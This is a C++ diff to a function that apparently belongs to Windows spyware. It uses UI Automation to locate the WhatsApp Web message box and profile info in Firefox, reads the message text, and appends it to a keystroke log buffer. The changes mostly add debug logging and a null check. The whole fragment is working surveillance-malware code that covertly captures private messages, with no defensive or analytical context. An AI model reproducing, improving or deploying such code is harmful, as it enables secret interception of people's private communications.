@@ -275,7 +275,6 @@ void MyAutomationEventHandler::HandleWhatsAppFF(IUIAutomationElement* pAutomatio
 	VariantInit(&vAriaRoleValue);
 	VariantInit(&vMsgValue);
 
-	CComPtr<IUIAutomation> pAutomation = g_pMyTreeWalker->GetPAutomation();
 	CComPtr<IUIAutomationCondition> pControlTypeCondition = NULL;
 	CComPtr<IUIAutomationCondition> pDefaultActionCondition = NULL;
 	CComPtr<IUIAutomationCondition> pInvokePatternCondition = NULL;
@@ -288,17 +287,26 @@ void MyAutomationEventHandler::HandleWhatsAppFF(IUIAutomationElement* pAutomatio
 	CComPtr<IUIAutomationElement> pAutomationElementReceiver = NULL;
 
 	IUIAutomationTreeWalker* pWalker = NULL;
+	IUIAutomation* pAutomation = g_pMyTreeWalker->GetPAutomation();
+
+	if (pAutomation == NULL)
+	{
+		Log(L"Cant get pAutomation from g_pMyTreeWalker", DBG);
+		goto exit;
+	}
 
 	// check for the right field
 	hr = pAutomationElement->GetCurrentPropertyValue(UIA_LegacyIAccessibleRolePropertyId, &vIAccessibleRoleValue);
 	if (FAILED(hr) || vIAccessibleRoleValue.iVal != 42)
 	{
+		Log(L"Cant get LegacyIAccessibleRolePropertyId from WebWhatsappFF handler", DBG);
 		goto exit;
 	}
 
 	hr = pAutomationElement->GetCurrentPropertyValue(UIA_AriaRolePropertyId, &vAriaRoleValue);
 	if (FAILED(hr) || vAriaRoleValue.bstrVal == NULL || wcscmp(vAriaRoleValue.bstrVal, L"textbox") != 0)
 	{
+		Log(L"Cant get AriaRolePropertyId from WebWhatsappFF handler", DBG);
 		goto exit;
 	}
 
@@ -315,12 +323,14 @@ void MyAutomationEventHandler::HandleWhatsAppFF(IUIAutomationElement* pAutomatio
 	pAutomationElementProfileInfo = g_pMyTreeWalker->FindFirstAscending(pAutomationElement, pAndCondition3);
 	if (pAutomationElementProfileInfo == NULL)
 	{
+		Log(L"Cant find profile info", DBG);
 		goto exit;
 	}
 
 	pWalker = g_pMyTreeWalker->GetPTreeWalker();
 	if (pWalker == NULL)
 	{
+		Log(L"Cant get treewalker", DBG);
 		goto exit;
 	}
 
@@ -344,6 +354,7 @@ void MyAutomationEventHandler::HandleWhatsAppFF(IUIAutomationElement* pAutomatio
 	hr = pAutomationElement->GetCurrentPropertyValue(UIA_ValueValuePropertyId, &vMsgValue);
 	if (FAILED(hr))
 	{
+		Log(L"Cant get msg contents", DBG);
 		goto exit;
 	}
 	wsLogKeyStroke += L"\nMsg: " + std::wstring(vMsgValue.bstrVal);
